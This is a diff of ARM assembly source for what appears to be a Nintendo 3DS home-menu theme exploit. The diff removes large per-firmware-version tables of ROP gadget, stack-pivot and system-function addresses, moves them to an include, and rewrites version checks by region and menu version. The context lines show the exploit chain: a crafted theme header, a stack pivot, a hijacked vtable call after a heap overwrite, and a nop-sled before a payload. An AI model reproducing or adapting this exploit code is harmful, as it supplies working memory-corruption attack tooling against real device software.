@@ -2,8 +2,6 @@
 .section .init
 .global _start
 
-@ This is the start of the decompressed theme data.
-
 /*
 All function addresses referenced here are for v9.4 homemenu.
 
@@ -15,344 +13,7 @@ L_2441a0: L_1e95e0(*(inr0+4)); ...
 L_1e95e0: objectptr = *(inr0+0x28); if(objectptr)<calls vtable funcptr +8 from objectptr> ...//This is where this haxx finally gets control over an objectptr(r0) + PC at the same time.
 */
 
-#ifndef SYSVER
-#error The SYSVER define must be set.
-#endif
-
-#if SYSVER<96
-	#define STACKPIVOT_ADR 0x00100fdc //7814bd30 ldmdavc r4, {r4, r5, r8, sl, fp, ip, sp, pc} (same addr for v9.1j - v9.5 all regions)
-#else
-	#define STACKPIVOT_ADR 0x00100fb8
-#endif
-
-#if SYSVER==96 || SYSVER==97
-	#define ROP_POPPC 0x0010201c
-	#define POP_R3PC 0x00102a80
-	#define POP_R4R5R6PC 0x00101b74
-	#define ROP_STR_R1TOR0 0x00104020
-	#define ROP_LDRR1_FROMR5ARRAY_R4WORDINDEX 0x001038c4
-#endif
-
-#if SYSVER==97
-	#define ROP_LOADR4_FROMOBJR0 0x0010b420
-	#define POP_R0PC 0x00157818
-	#define POP_R1PC 0x00236efc
-	#define POP_R2R6PC 0x0015040c
-	#define POP_R4LR_BXR1 0x0011a268
-	#define POP_R4R8LR_BXR2 0x00133380
-
-	#define ROP_LDR_R0FROMR0 0x00118cdc
-	#define ROP_LDRR1R1_STRR1R0 0x00213e64
-	#define ROP_MOVR1R3_BXIP 0x001cec08
-	#define ROP_ADDR0_TO_R1 0x0012b080
-	#define ROP_CMPR0R1 0x002a1810
-
-	#define ROP_INITOBJARRAY 0x0022be09
-
-	#define MEMCPY 0x001536f0
-
-	#define svcControlMemory 0x002355ec
-	#define svcSleepThread 0x0012b044
-
-	#define SRV_GETSERVICEHANDLE 0x00235644
-
-	#define GXLOW_CMD4 0x0014b99c
-
-	#define NSS_LaunchTitle 0x0023110c
-	#define NSS_RebootSystem 0x0013738c
-
-	#define CFGIPC_SecureInfoGetRegion 0x001377b0
-#endif
-
-#if SYSVER==96
-	#define ROP_LOADR4_FROMOBJR0 0x0010b4b8
-	#define POP_R0PC 0x001576d4
-	#define POP_R1PC 0x00237040
-	#define POP_R2R6PC 0x001502c8
-	#define POP_R4LR_BXR1 0x0011a2c4
-	#define POP_R4R8LR_BXR2 0x001333dc
-
-	#define ROP_LDR_R0FROMR0 0x00118d38
-	#define ROP_LDRR1R1_STRR1R0 0x00213f9c
-	#define ROP_MOVR1R3_BXIP 0x001ce768
-	#define ROP_ADDR0_TO_R1 0x0012b0dc
-	#define ROP_CMPR0R1 0x002a19a8
-
-	#define ROP_INITOBJARRAY 0x0022bf45
-
-	#define MEMCPY 0x001535ac
-
-	#define svcControlMemory 0x00235730
-	#define svcSleepThread 0x0012b0a0
-
-	#define SRV_GETSERVICEHANDLE 0x00235788
-
-	#define GXLOW_CMD4 0x0014b858
-
-	#define NSS_LaunchTitle 0x0023125c
-	#define NSS_RebootSystem 0x001373e8
-
-	#define CFGIPC_SecureInfoGetRegion 0x0013780c
-#endif
-
-#if SYSVER==94
-	#define IFile_Read 0x00218b1c //inr0=ctx inr1=u32* total transferred data inr2=buf inr3=size
-#elif SYSVER==93
-	#define IFile_Read 0x00218b3c
-#endif
-
-#if SYSVER==93 || SYSVER==94
-	#define POP_R4LR_BXR1 0x0011df68 //"pop {r4, lr}" "bx r1"
-	#define POP_R4R8LR_BXR2 0x00133f8c //"pop {r4, r5, r6, r7, r8, lr}" "bx r2"
-
-	#define NSS_RebootSystem 0x00136a0c
-
-	#define CFGIPC_SecureInfoGetRegion 0x00136ea4 //inr0=u8* out
-
-	#define GSPGPU_Shutdown 0x0011dc1c
-	#define GSPGPU_FlushDataCache 0x0014ab98
-
-	#define APT_SendParameter 0x00214ab0 //inr0=dst appid inr1=signaltype inr2=parambuf* inr3=parambufsize insp0=handle
-
-	#define FS_MountSdmc 0x0011cacc //inr0=archivename*
-
-	#define IFile_Open 0x00218c1c //inr0=ctx inr1=utf16* path inr2=openflags
-	#define IFile_Close 0x0021dcbc //inr0=ctx
-#elif SYSVER==95
-	#define POP_R4LR_BXR1 0x0011df5c
-	#define POP_R4R8LR_BXR2 0x00133f80
-
-	#define NSS_RebootSystem 0x00136a00
-
-	#define CFGIPC_SecureInfoGetRegion 0x00136e98
-
-	#define GSPGPU_Shutdown 0x0011dc10
-	#define GSPGPU_FlushDataCache 0x0014ab88
-
-	#define APT_SendParameter 0x00214a3c
-
-	#define FS_MountSdmc 0x0011cac0
-
-	#define IFile_Open 0x00218ba8
-	#define IFile_Close 0x0021dc48
-	#define IFile_Read 0x00218aa8
-#elif SYSVER==96
-	#define GSPGPU_Shutdown 0x00119f78
-	#define GSPGPU_FlushDataCache 0x0014b754
-
-	#define APT_SendParameter 0x00227700
-
-	#define FS_MountSdmc 0x00118bc4
-
-	#define IFile_Open 0x0022babc
-	#define IFile_Close 0x0022f854
-	#define IFile_Read 0x0022b9a8
-#elif SYSVER==97
-	#define GSPGPU_Shutdown 0x00119f1c
-	#define GSPGPU_FlushDataCache 0x0014b898
-
-	#define APT_SendParameter 0x002275c4
-
-	#define FS_MountSdmc 0x00118b68
-
-	#define IFile_Open 0x0022b980
-	#define IFile_Close 0x0022f718
-	#define IFile_Read 0x0022b86c
-#endif
-
-#if SYSVER>=93 && SYSVER<=95 //v9.3-v9.5
-	#define ROP_LOADR4_FROMOBJR0 0x10b574 //load r4 from r0+16, return if r4==r5. obj/r0 = r4-32. call vtable funcptr +12 from this obj.
-	#define ROP_POPPC 0x10203c
-	#define ROP_LDRR1_FROMR5ARRAY_R4WORDINDEX 0x001037fc//"ldr r1, [r5, r4, lsl #2]" "ldr r2, [r0]" "ldr r2, [r2, #20]" "blx r2"
-	#define POP_R4R5R6PC 0x00101b94 //"pop {r4, r5, r6, pc}"
-
-	#define ROP_COND_THROWFATALERR 0x001028f8//When r0 is not negative, this executes "pop {r3, r4, r5, pc}". Otherwise it executes: "pop {r3, r4, r5, lr}" "b <throwfatalerr func>"
-#elif SYSVER<93
-	#define ROP_LOADR4_FROMOBJR0 0x10b64c
-	#define ROP_POPPC 0x102028
-	#define POP_R4LR_BXR1 0x0011dda4
-	#define ROP_LDRR1_FROMR5ARRAY_R4WORDINDEX 0x001037d8
-	#define POP_R4R8LR_BXR2 0x00136d5c
-	#define POP_R4R5R6PC 0x00101b90
-
-	#define CFGIPC_SecureInfoGetRegion 0x00139d0c
-
-	#define GSPGPU_Shutdown 0x0011da58
-
-	#define NSS_RebootSystem 0x00139874
-
-	#define ROP_COND_THROWFATALERR 0x001028dc
-#endif
-
-#if SYSVER==96 || SYSVER==97
-	#define ROP_COND_THROWFATALERR 0x001028e4
-#endif
-
-#if SYSVER == 93
-	#define SRV_GETSERVICEHANDLE 0x0022472c
-	#define POP_R1PC 0x002262bc
-#elif SYSVER == 94
-	#define SRV_GETSERVICEHANDLE 0x0022470c
-	#define POP_R1PC 0x0022629c
-#elif SYSVER == 95
-	#define POP_R1PC 0x00226264
-	#define SRV_GETSERVICEHANDLE 0x002246d4
-#endif
-
-#if SYSVER==93 || SYSVER==94//v9.3-v9.4
-	#define POP_R0PC 0x00154f0c
-	#define POP_R2R6PC 0x001512c4 //pop {r2, r3, r4, r5, r6, pc}
-	#define ROP_LDRR1R1_STRR1R0 0x002003bc
-	#define ROP_MOVR1R3_BXIP 0x001c2e24
-	#define ROP_ADDR0_TO_R1 0x0012b64c
-
-	#define MEMCPY 0x00150940
-
-	#define svcSleepThread 0x0012b590
-
-	#define GXLOW_CMD4 0x0014ac9c
-#endif
-
-#if SYSVER==95
-	#define POP_R0PC 0x00154ef0
-	#define POP_R2R6PC 0x001512b4
-	#define ROP_LDRR1R1_STRR1R0 0x002003a0
-	#define ROP_MOVR1R3_BXIP 0x001c2e08
-	#define ROP_ADDR0_TO_R1 0x0012b640
-
-	#define MEMCPY 0x00150930
-
-	#define svcSleepThread 0x0012b584
-
-	#define GXLOW_CMD4 0x0014ac8c
-#endif
-
-#if SYSVER==97
-	#define ORIGINALOBJPTR_BASELOADADR 0x0032d848
-#endif
-
-#if SYSVER==96
-	#define ORIGINALOBJPTR_BASELOADADR 0x0032e848
-#endif
-
-#if SYSVER>=93 && SYSVER<=95 //v9.3-v9.5
-	#define POP_R3PC 0x00102a40
-
-	#define ROP_STR_R1TOR0 0x00103f58
-	#define ROP_LDR_R0FROMR0 0x0010f01c
-
-	#define ORIGINALOBJPTR_BASELOADADR 0x0031382c //The ptr stored here+8 is the ptr stored in the saved r4 value in the stackframe, which was overwritten by memchunkhax.
-#endif
-
-#if SYSVER>=90 && SYSVER <= 92 //v9.0-v9.2
-	#define ROP_STR_R1TOR0 0x00103f40
-	#define ROP_LDR_R0FROMR0 0x0010efe8
-	#define ROP_ADDR0_TO_R1 0x0012e708
-
-	#define FS_MountSdmc 0x0011c9b4
-#endif
-
-#if SYSVER == 92
-	#define POP_R0PC 0x001575ac
-	#define POP_R1PC 0x00214988
-	#define POP_R3PC 0x00102a24
-	#define POP_R2R6PC 0x00150160
-
-	#define ROP_LDRR1R1_STRR1R0 0x001f1e7c
-	#define ROP_MOVR1R3_BXIP 0x001b8708
-
-	#define ROP_CMPR0R1 0x0027e344
-
-	#define MEMCPY 0x001536f8
-
-	#define svcSleepThread 0x0012e64c
-
-	#define SRV_GETSERVICEHANDLE 0x00212de0
-
-	#define GXLOW_CMD4 0x0014d65c
-
-	#define GSPGPU_FlushDataCache 0x0014d558
-
-	#define APT_SendParameter 0x00205ba0
-
-	#define IFile_Open 0x00209f20
-	#define IFile_Close 0x0020c148
-	#define IFile_Read 0x00209e0c
-#endif
-
-#if SYSVER>=90 && SYSVER <= 91 //v9.0-v9.1j
-	#define POP_R0PC 0x00157554
-	#define POP_R1PC 0x002149f0
-	#define POP_R3PC 0x00102a24
-	#define POP_R2R6PC 0x00150108
-
-	#define ROP_LDRR1R1_STRR1R0 0x001f1ee4
-	#define ROP_MOVR1R3_BXIP 0x001b8848
-
-	#define ROP_INITOBJARRAY 0x0020a40d
-
-	#define ROP_CMPR0R1 0x0027e450
-
-	#define MEMCPY 0x001536a0
-
-	#define svcControlMemory 0x00212df0
-	#define svcSleepThread 0x0012e64c
-
-	#define SRV_GETSERVICEHANDLE 0x00212e48
-
-	#define GXLOW_CMD4 0x0014d604
-
-	#define GSPGPU_FlushDataCache 0x0014d500
-
-	#define NSS_LaunchTitle 0x0020e6a8
-
-	#define ORIGINALOBJPTR_BASELOADADR 0x002f1820
-
-	#define APT_SendParameter 0x00205c08
-
-	#define IFile_Open 0x00209f88
-	#define IFile_Close 0x0020c1b0
-	#define IFile_Read 0x00209e74
-#endif
-
-#if SYSVER == 95
-	#define ROP_CMPR0R1 0x00294698
-	#define ROP_INITOBJARRAY 0x00219031
-
-	#define svcControlMemory 0x0022467c
-
-	#define NSS_LaunchTitle 0x002201b8
-#endif
-
-#if SYSVER == 94
-	#define NSS_LaunchTitle 0x0022022c //inr0=procid out* inr1=unused inr2/inr3=u64 programid insp0=u8 mediatype
-
-	#define svcControlMemory 0x002246b4
-
-	#define ROP_INITOBJARRAY 0x002190a5 //inr0=arrayptr* inr1=funcptr inr2=entrysize inr3=totalentries This basically does: curptr = inr0; while(inr3){<call inr1 funcptr with r0=curptr>; curptr+=inr2; inr3--;}
-
-	#define ROP_CMPR0R1 0x002946d0 // "cmp r0, r1" "movge r0, #1" "movlt r0, #0" "pop {r4, pc}"
-#endif
-
-#if SYSVER == 93
-	#define NSS_LaunchTitle 0x0022024c
-
-	#define svcControlMemory 0x002246d4
-
-	#define ROP_INITOBJARRAY 0x002190c5
-
-	#define ROP_CMPR0R1 0x002946ac
-#endif
-
-#if SYSVER == 92
-	#define NSS_LaunchTitle 0x0020e640
-
-	#define svcControlMemory 0x00212d88
-
-	#define ROP_INITOBJARRAY 0x0020a3a5
-
-	#define ORIGINALOBJPTR_BASELOADADR 0x002f0820
-#endif
+//The addresses for the ROP-chain is from an include, see the Makefile gcc line with -include / README.
 
 #define TARGETOVERWRITE_STACKADR TARGETOVERWRITE_MEMCHUNKADR+12
 
@@ -368,10 +29,14 @@ L_1e95e0: objectptr = *(inr0+0x28); if(objectptr)<calls vtable funcptr +8 from o
 #ifndef LOADSDPAYLOAD
 	#define CODEBINPAYLOAD_SIZE (codedataend-codedatastart)
 #else
-	#if SYSVER < 96
-	#define CODEBINPAYLOAD_SIZE 0x4000
+	#if NEW3DS==0
+		#define CODEBINPAYLOAD_SIZE 0x4000
 	#else
-	#define CODEBINPAYLOAD_SIZE 0x5000
+		#if (REGIONVAL==0 && MENUVERSION<19476) || (REGIONVAL!=0 && MENUVERSION<16404)//Check for system-version <v9.6.
+			#define CODEBINPAYLOAD_SIZE 0x4000
+		#else
+			#define CODEBINPAYLOAD_SIZE 0x5000
+		#endif
 	#endif
 #endif
 
@@ -507,6 +172,7 @@ _start:
 
 themeheader:
 #ifndef BUILDROPBIN
+@ This is the start of the decompressed theme data.
 .word 1 @ version
 #else
 .word POP_R0PC @ Stack-pivot to ropstackstart.
@@ -535,16 +201,16 @@ stackpivot_pcloadword:
 .word HEAPBUF + (object - _start) @ Actual object-ptr loaded by L_1e95e0, used for the vtable functr +8 call.
 
 .space ((object + 0x2ec) - .)
-#if SYSVER > 92 //Dunno if this applies for versions other than v9.2.
+#if (REGIONVAL==0 && MENUVERSION>15360) || (REGIONVAL!=0 && MENUVERSION>12288) //Dunno if this applies for versions other than v9.2.
 .word 0 @ The target ptr offset is 0x4-bytes different from v9.2.
 #endif
 .word HEAPBUF + (object - _start) @ Ptr loaded by L_1d1ea8, passed to L_2441a0 inr0.
 
 .space ((object + 0x3a60) - .)
-#if SYSVER <= 92 //Dunno if this applies for versions other than v9.2.
+#if (REGIONVAL==0 && MENUVERSION<=15360) || (REGIONVAL!=0 && MENUVERSION<=12288) //Dunno if this applies for versions other than v9.2.
 .word 0 @ The target ptr offset is 0x4-bytes different from v9.4.
 #endif
-#if SYSVER >= 96
+#if (REGIONVAL==0 && MENUVERSION>=19476) || (REGIONVAL!=0 && MENUVERSION>=16404) //Check for system-version v9.6.
 .space 0x40
 #endif
 .word HEAPBUF + (object - _start) @ Ptr loaded by L_1ca5d0, passed to L_1d1ea8() inr0.
@@ -893,7 +559,7 @@ codedatastart:
 #if NEW3DS==0
 .space 0x200 @ nop-sled
 #else
-#if SYSVER < 96
+#if (REGIONVAL==0 && MENUVERSION<19476) || (REGIONVAL!=0 && MENUVERSION<16404)
 .space 0x1000
 #else
 .space 0x2000 @ Size 0x2000 is needed for SKATER >=v9.6, but doesn't work with the initial version of SKATER for whatever reason.
